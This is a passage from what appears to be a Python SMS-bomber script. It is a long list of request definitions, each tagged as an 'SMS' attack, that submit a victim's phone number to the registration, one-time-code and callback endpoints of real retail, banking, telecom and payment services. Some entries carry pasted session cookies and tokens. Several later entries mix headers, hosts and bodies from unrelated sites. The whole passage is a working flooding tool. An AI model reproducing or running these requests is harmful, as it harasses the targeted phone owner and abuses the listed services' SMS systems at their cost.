            'data': {'Birthday': '1986-07-10T07:19:56.276+02:00', 'DocIssueDate': '2004-02-05T07:19:56.276+02:00', 'DocNumber': 433233, 'DocSeries': 5675, 'FirstName': 'Миша', 'Gender': 'M', 'LastName': 'Инин', 'SecondName': 'Инович', 'Phone': number, 'Email': email()},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Invitro', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'password': 'fFDDFFE23$', 'application': 'lkp', 'login': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Iqlab', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://iqlab.com.ua/session/ajaxregister',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'cellphone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ivi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Iwant', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://i-want.ru/api/auth/v1/customer/login/phone',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://izi.ua/api/auth/register',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': f'+{number}', 'name': 'Мiша', 'is_terms_accepted': True},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kant', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.kant.ru/ajax/profile/send_authcode.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'Phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Karusel', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app.karusel.ru/api/v1/phone/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kaspi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kaspi.kz/util/send-app-link',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'address': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'KFC', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kilovkusa', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kilovkusa.ru/ajax.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'block': 'auth', 'action': 'send_register_sms_code', 'data_type': 'json', 'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kinolab', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
            'headers': {'Agent': 'website'},
            'data': {'Phone': number, 'Type': 1},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Koronapay', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://koronapay.com/transfers/online/api/users/otps',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Krista', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kvivstart', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cas-api.kyivstar.ua/api/sendSms',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'lang': 'uk', 'msisdn': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Lenta', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://lenta.com/api/v1/authentication/requestValidationCode',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Levin', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'url': '/api/client/phone_verification', 'method': 'POST', 'data': {'client_id': 5646981, 'phone': number, 'alisa_id': 1}, 'headers': {'Client-Id': 5646981, 'Content-Type': 'application/x-www-form-urlencoded'}},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Limetaxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://212.22.223.149:7200/api/account/register/sendConfirmCode',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Loany', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://loany.com.ua/funct/ajax/registration/code',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Logistic', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api-rest.logistictech.ru/api/v1.1/clients/request-code',
            'headers': {'Restaurant-chain': 'c0ab3d88-fba8-47aa-b08d-c7598a3be0b9', 'User-Agent': user_agent()[1]},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Makarolls', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'data': number, 'metod': 'postreg'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Makimaki', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://makimaki.ru/system/callback.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'cb_fio': 'Иванов', 'cb_phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Menuau', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'user_info[fullname]': 'Миша Иванов', 'user_info[phone]': number, 'user_info[email]': email(), 'user_info[password]': 'DFJkffd$$#5213', 'user_info[conf_password]': f'+{number}'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Menzacafe', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://menza-cafe.ru/system/call_me.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'fio': 'Иванов', 'phone': number, 'phone_number': '1'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mistercash', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://my.mistercash.ua/ru/send/sms/registration',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'number': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mngogomenu', 'anonymous': 'No'},
            'method': 'get',
            'url': f'http://mnogomenu.ru/office/password/reset/{number}',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mobileplanet', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mobileplanet.ua/register',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'klient_name': username(), 'klient_phone': number, 'klient_email': email()},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Modulbank', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.modulbank.ru/api/v2/registration/nameAndPhone',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'FirstName': 'Миша', 'CellPhone': number, 'Package': 'optimal'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Molbulak', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.molbulak.ru/ajax/smsservice.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'command': 'send_code_loan', 'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Moneymanu', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://moneyman.ru/registration_api/actions/send-confirmation-code',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': number,
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Monobank', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mospizza', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'name': 'Миша', 'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Moyo', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.moyo.ua/identity/registration',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'firstname': 'Миша', 'phone': number, 'email': email()},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mtstv', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'msisdn': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Multiplex', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.multiplex.ua/login',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'login': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mygames', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://account.my.games/signup_send_sms/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Niyama', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'REGISTER[PERSONAL_PHONE]': number, 'code': '', 'sendsms': 'Выслать код'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nl', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.nl.ua',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'component': 'bxmaker.authuserphone.login', 'sessid': 'bf70db951f54b837748f69b75a61deb4', 'method': 'sendCode', 'phone': number, 'registration': 'N'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nncard', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://nn-card.ru/api/1.0/register',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'password': 'Bromr$@3246563'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Nova', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'modelName': 'LoyaltyUserGeneral', 'calledMethod': 'registration', 'system': 'PA 3.0', 'methodProperties': {'City': '8d5a980d-391c-11dd-90d9-001a92567626', 'FirstName': 'Иван', 'LastName': 'Иванов', 'Patronymic': username(), 'Phone': number, 'Email': email(), 'BirthDate': '06.06.2010', 'Password': '0c465655c53d2d8ec971581f5dfdbd83', 'Gender': 'M', 'CounterpartyType': 'PrivatePerson', 'MarketplacePartnerToken': '005056887b8d-b5da-11e6-9f54-cea38574'}},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ok', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'st.r.phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Okean', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://okeansushi.ru/includes/contact.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'call_mail': '1', 'ajax': '1', 'name': 'Миша', 'phone': number, 'call_time': '1', 'pravila2': 'on'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oldi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.oldi.ru/ajax/reg.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'method': 'isUserPhone', 'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Onlineua', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://secure.online.ua/ajax/check_phone/',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'params': {'reg_phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Osaka', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.osaka161.ru/local/tools/webstroy.webservice.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'name': 'Auth.SendPassword', 'params[0]': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ozon', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number, 'otpId': 0},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Panpizza', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'telephone': '8' + str(number)[1:]},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Pirogin', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://piroginomerodin.ru/index.php?route=sms/login/sendreg',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'telephone': f'+{number}'},
        },
        {
            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Pizza46', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pizza46.ru/ajaxGet.php',
            'headers': {'User-Agent': user_agent()[1], 'DNT': '1'},
            'data': {'phone': number},
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'sso.mtsbank.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://sso.mtsbank.ru/api/v2/login',
            'headers': {
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': 'qrator_jsr=1680818266.827.uR41XSPbgvUJE8Xa-lpmkcfb190101po5rtn8h9foslqsq079-00; qrator_jsid=1680818266.827.uR41XSPbgvUJE8Xa-1redjnbektn4utj2iq5qul410g6rdnge; currentDeliveryMode=pickup; currentRegion=RU-MOW; currentPOS=C027; qrator_ssid=1680818267.798.xsKAKUr2I4yNKPSP-5a8dnsdnl8empsduf802qc29i9sve34l; dtCookie=v_4_srv_35_sn_C70F1F71341E56B38BF9A05A4DF90220_perc_100000_ol_0_mul_1_app-3Ab08f9e5bb12c9b66_1; anonymous-consents=%5B%7B%22templateCode%22%3A%22adpr%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22generic%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22marketing%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%5D; cookie-notification=NOT_ACCEPTED; JSESSIONID=c8db0bd9-3a21-4785-bd9f-f4fc38e54b5f; rxVisitor=1680818386454AHM0FODTPETFQ6JSPJ2JT19ICCJ7T7BO; dtSa=-; age-confirmed=1; isNearestPos=false; dtLatC=1; rxvt=1680820235546|1680818386455; dtPC=35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
                'dnt': '1',
                'referer': 'https://www.winelab.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F',
                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-dtpc': '35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
                'x-requested-with': 'XMLHttpRequest'
            },
            'data': {
                "login": number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.winelab.ru',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.winelab.ru/confirmation/sendByPhone?number={winelab}',
            'headers': {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '2160',
                'content-type': 'application/json',
                'cookie': 'site_version=desktop; first_hit_url=%2F; uid=8CBABAB97E432F64661B1A9002B825C9; geo_city_confirmed=yes; advcake_track_id=c933ef3c-a713-5b3a-cae6-44dfcee9143a; advcake_session_id=3a896168-08ed-0339-4511-eb79acf25417; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiZDNjNTc2ODktOGEyOS00Zjc1LWEzZWYtZjc2YWYwMTg2MTFhIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6ImM3MDg3NGZkLTQ4N2EtNDJmYi1iM2M5LTYwNDhkZTA3ZjVhYyIsImlhdCI6MTY4MDgxOTA3MiwiZXhwIjoxNjgwODE5NjcyLCJqdGkiOiJkM2M1NzY4OS04YTI5LTRmNzUtYTNlZi1mNzZhZjAxODYxMWEifQ.UoWfOrRIlgP-A2dbQbv5PqhgPwcXp9zL3AH95Yuw7bA; sid=ubq6jGQvQ4KQGhtmySYDAg==; city=msk; ets=%2F%2C%2C1680819081; wtfId=1186662-1680819081.666-194.32.122.23-44425',
                'dnt': '1',
                'origin': 'https://profi.ru',
                'referer': 'https://profi.ru/cabinet/login/',
                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-app-id': 'PROFI',
                'x-new-auth-compatible': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-wtf-id': '1186662-1680819078.359-194.32.122.23-44425'
            },
            'data': {
                '{"query': '#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c',
                '510e2159ee8fcfb2c5b9\nquery authStrategyStart($type': 'AuthStrategyType!, ',
                '$initialState': 'AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, ',
                'initialState': '{',
                'variables': '{',
                'type': number,
                'phoneNumber': number,
                'defaultOrderCityId': 'prfr',
                'currentHost': 'https://profi.ru'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'spb.profi.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://spb.profi.ru/graphql',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': '__ddg1_=Ugw1h8FzFgIdsoFRF8oF; PHPSESSID=bl2srubtrv1nplb0gd05a2729n; cguuid=1667495511_bl2srubtrv1nplb0gd05a2729n; chg_ref=https%3A%2F%2Fwww.google.com%2F; chg_req=https%3A%2F%2Fwww.chitai-gorod.ru%2F; cityId=213; cityName=%C3%EE%F0%EE%E4%20%CC%EE%F1%EA%E2%E0; countryId=643; countryName=%D0%EE%F1%F1%E8%FF; newsite=1; VisitorId=3ee9d4ec-5370-43ea-8217-af98e2de47cb; showed_action-banner-244=1',
                'origin': 'https://www.chitai-gorod.ru',
                'referer': 'https://www.chitai-gorod.ru/',
                'sec-ch-ua': 'Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent()[1],
                'AB-TESTS': '{"personal_feed":"cumulative"}',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Length': '41',
                'Content-Type': 'application/json',
                'Cookie': 'popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; ccart=off',
                'DNT': '1',
                'Host': 'api.sunlight.net',
                'Origin': 'https://sunlight.net',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user_agent()[1],
                'X-Requested-With': 'SunlightFrontendApp'
            },
            'data': {
                'countryCode': 'RU',
                'isMobileBrowser': '0',
                'phoneOperatingSystem': 'android',
                'phoneNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'api.sunlight.net',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.sunlight.net/v3/customers/authorization/',
            'headers': {

            },
            'data': {
                '{"/appData/action': number,
                '/initiatePhoneConfirmData/phoneCountry': 'KZ',
                '/paypalAccountData/phoneOption': 'Mobile',
                '/paypalAccountData/phoneNumber': number,
                '/paypalAccountData/createUpdateReady': 'False',
                '/initiatePhoneConfirmData/sendSms': 'yes',
                '/initiatePhoneConfirmData/createUpdateReady': 'True',
                '/initiatePhoneConfirmData/phoneNumber': number,
                '/initiatePhoneConfirmData/phoneCountryCode': '7"}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.paypal.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.paypal.com/KZ/welcome/signup',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': '_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb',
                'origin': 'https://www.citilink.ru',
                'referer': 'https://www.citilink.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-requested-with': 'XMLHttpRequest'
            },
            'data': {"/appData/action": "init_phone_confirmation", "/appData/griffinData": "true",
                   "/initiatePhoneConfirmData/phoneCountry": "KZ",
                   "/paypalAccountData/phoneOption": "Mobile",
                   "/paypalAccountData/phoneNumber": str(number)[1:], "/paypalAccountData/phoneCountryCode": "7",
                   "/paypalAccountData/createUpdateReady": False,
                   "/initiatePhoneConfirmData/sendSms": "yes",
                   "/initiatePhoneConfirmData/createUpdateReady": True,
                   "/initiatePhoneConfirmData/phoneNumber": str(number)[1:],
                   "/initiatePhoneConfirmData/phoneCountryCode": "7"}
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.citilink.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.citilink.ru/registration/confirm/phone/+{phone}/',
            'headers': {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': 'geo_region_url=www; _ym_uid=16563772911015405951; _ym_d=1656377291; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_site=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; _ga=GA1.2.8228657.1662288395; _gid=GA1.2.158704625.1662288395; _gat=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20OPR%2F89.0.4447.104; _ym_isad=1; _ym_visorc=w; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=; geo_detect_url=www; geo_detect=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_detect_coords=55.755787%2C37.617634; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                'DNT': '1',
                'Host': 'oapi.raiffeisen.ru',
                'Origin': 'https://www.raiffeisen.ru',
                'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
